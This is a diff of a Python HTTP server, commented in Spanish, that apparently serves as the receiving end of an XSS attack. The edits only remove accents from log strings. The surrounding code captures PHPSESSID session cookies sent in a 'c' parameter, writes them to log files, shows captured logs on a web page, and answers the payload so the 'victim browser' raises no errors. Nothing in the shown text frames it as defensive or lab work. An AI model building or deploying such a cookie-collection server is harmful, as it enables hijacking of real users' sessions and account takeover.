@@ -27,7 +27,7 @@ class RequestHandler(BaseHTTPRequestHandler):
         }
         
         print(f"\n{'='*80}", file=sys.stderr, flush=True)
-        print(f"[{datetime.now()}] 📥 Petición recibida:", file=sys.stderr, flush=True)
+        print(f"[{datetime.now()}] 📥 Peticion recibida:", file=sys.stderr, flush=True)
         print(f"📎 Path: {self.path}", file=sys.stderr, flush=True)
         
         # Si hay parámetro 'c', procesamos las cookies
@@ -53,7 +53,7 @@ class RequestHandler(BaseHTTPRequestHandler):
                             part = part.strip()
                             if part.startswith('PHPSESSID='):
                                 phpsessid = part[10:]  # Remover "PHPSESSID="
-                                f.write(f"✅ PHPSESSID extraída: {phpsessid}\n")
+                                f.write(f"✅ PHPSESSID extraida: {phpsessid}\n")
                                 print(f"✅ PHPSESSID encontrada: {phpsessid}", file=sys.stderr, flush=True)
                                 
                                 # Guardar también en archivo separado (compatible con tu versión)
@@ -61,8 +61,8 @@ class RequestHandler(BaseHTTPRequestHandler):
                                     pf.write(f"{datetime.now()} - {phpsessid}\n")
                                 break
                     else:
-                        f.write("⚠️  No se encontró PHPSESSID\n")
-                        print("⚠️  No se encontró PHPSESSID en la cookie", file=sys.stderr, flush=True)
+                        f.write("⚠️  No se encontro PHPSESSID\n")
+                        print("⚠️  No se encontro PHPSESSID en la cookie", file=sys.stderr, flush=True)
             except Exception as e:
                 print(f"❌ Error escribiendo archivo: {e}", file=sys.stderr, flush=True)
         
@@ -83,7 +83,7 @@ class RequestHandler(BaseHTTPRequestHandler):
                     end = len(c_value)
                 phpsessid = c_value[start:end]
                 
-                print(f"[+] PHPSESSID extraída: {phpsessid}", file=sys.stderr, flush=True)
+                print(f"[+] PHPSESSID extraida: {phpsessid}", file=sys.stderr, flush=True)
                 
                 # Guardar solo PHPSESSID en archivo (para uso rápido)
                 try:
@@ -92,9 +92,9 @@ class RequestHandler(BaseHTTPRequestHandler):
                 except:
                     pass
             else:
-                print("[-] No se encontró PHPSESSID", file=sys.stderr, flush=True)
+                print("[-] No se encontro PHPSESSID", file=sys.stderr, flush=True)
         else:
-            print(f"[?] Petición recibida sin parámetros: {self.path}", file=sys.stderr, flush=True)
+            print(f"[?] Peticion recibida sin parametros: {self.path}", file=sys.stderr, flush=True)
         
         # ========== NUEVO: Endpoints adicionales ==========
         # Si es la raíz, mostrar página de estado
@@ -134,10 +134,10 @@ class RequestHandler(BaseHTTPRequestHandler):
             try:
                 with open('cookies_captured.log', 'r', encoding='utf-8') as f:
                     logs = f.read()[-5000:]  # últimos 5KB
-                html = f"<html><body><h1>Últimos logs</h1><pre>{logs}</pre></body></html>"
+                html = f"<html><body><h1>Ultimos logs</h1><pre>{logs}</pre></body></html>"
                 self.wfile.write(html.encode('utf-8'))
             except:
-                self.wfile.write(b"<h1>No hay logs aún</h1>")
+                self.wfile.write(b"<h1>No hay logs aun</h1>")
             return
         
         # Respuesta simple para el payload XSS (evitar errores en navegador víctima)
